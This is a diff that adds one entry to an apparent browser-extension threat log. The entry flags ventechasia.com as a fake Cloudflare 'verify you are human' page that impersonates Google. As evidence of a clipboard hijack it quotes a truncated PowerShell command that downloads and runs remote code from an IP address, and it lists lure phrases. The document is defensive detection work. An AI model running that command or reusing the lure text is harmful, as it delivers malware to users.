@@ -1,5 +1,20 @@
 [
   {
+    "id": "MmKfzPCX94os",
+    "time": 1783580643,
+    "title": "[THREAT] ventechasia.com - Score 64",
+    "tags": [
+      "warning",
+      "shield",
+      "score_64"
+    ],
+    "source": "extension",
+    "url": "https://ventechasia.com/?id=9228023&__cf_chl_rt_tk=0WTT341v83OfTlu9_sVt0mpCGs8eiXGuXRj0LgIbMkt4-1759406441-1.0.1.1-cKgxnjeNC3bilN23wwtGd4ZTe00EYBZDCXqqw55zKFcc",
+    "host": "ventechasia.com",
+    "score": 64,
+    "body": "**URL:** `https://ventechasia.com/?id=9228023&__cf_chl_rt_tk=0WTT341v83OfTlu9_sVt0mpCGs8eiXGuXRj0LgIbMkt4-1759406441-1.0.1.1-cKgxnjeNC3bilN23wwtGd4ZTe00EYBZDCXqqw55zKFcc`\n**Host:** `ventechasia.com`\n**Score:** 64 / 100\n**Reported:** 2026-07-09 07:04:02 UTC\n**Extension:** v1.0.0\n\n### Page Info\n**Title:** Checking if you are human\n**Description:** N/A\n**Language:** en\n**Protocol:** https:\n**Referrer:** https://ventechasia.com/\n\n### Page Structure\n**Forms:** 0 | **Password/text/email inputs:** 0\n**Iframes:** 0 | **External scripts:** 0 | **Links:** 0\n\n### Detections\n- **FAKE CLOUDFLARE TEXT** *(+32pts)*: 4 fake Cloudflare/CAPTCHA text signals\n  > `Verify you are human`\n  - *Suspicious keywords matched (10):*\n    - `Verify you are human`\n    - `I am not a robot`\n    - `Ray ID: 475e96bc6652cd57`\n    - `To better prove you are not a robot`\n    - `prove you are not a robot`\n    - `In the verification window`\n    - `ventechasia.com needs to review the security`\n    - `Platform performance and security`\n    - `Perform the steps above to finish verification`\n    - `You will observe and agree`\n- **VISUAL BRAND IMPERSONATION** *(+12pts)*: Page visually impersonates Google (4 visual signals) on non-official domain ventechasia.com\n  > `favicon:https://www.google.com/s2/favicons?sz=128&domain=ventechasia | logo:https://www.google.com/s`\n- **FAVICON BRAND MISMATCH** *(+20pts)*: Favicon loaded from google CDN (www.google.com) but page is on ventechasia.com\n  > `https://www.google.com/s2/favicons?sz=128&domain=ventechasia.com`\n- **CLIPBOARD HIJACK** *(+40pts)*: Clipboard hijack via execCommand copy\n  > `powershell.exe -W H -ep B -nop -c \"IEX (New-Object Net.WebClient).DownloadString('https://46.161.0.5`\n\n### Extracted URLs (4)\n- `https://www.google.com/s2/favicons?sz=128&domain=ventechasia.com`\n- `https://www.google.com/s2/favicons?sz=128&amp;domain=ventechasia.com`\n- `http://www.w3.org/2000/svg`\n- `https://www.google.com/s2/favicons?sz=128&amp;domain=ventechasia`"
+  },
+  {
     "id": "5TrFQXKe3k1k",
     "time": 1783512872,
     "title": "[THREAT] unknown - Score 555",
